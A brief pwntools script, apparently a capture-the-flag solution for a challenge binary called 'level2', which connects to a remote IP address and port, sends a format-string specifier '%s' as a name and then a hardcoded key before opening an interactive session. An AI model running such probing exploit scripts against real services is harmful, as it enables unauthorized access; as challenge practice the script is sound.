from pwn import *

io = remote('54.169.55.172', 1025)
#io = process('./level2')
#gdb.attach(io, api=True)

def byte_xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])

key = b'w3Lc0m37iS'
key2 = b'w3Lh>J37iS'
str = b'IamHaCer!!'
str2 = b'IamCoder!!'


io.recvuntil(b'name:')
io.sendline(b'%s')
io.recvuntil(b'want :))))')
io.sendline(key)


io.interactive()
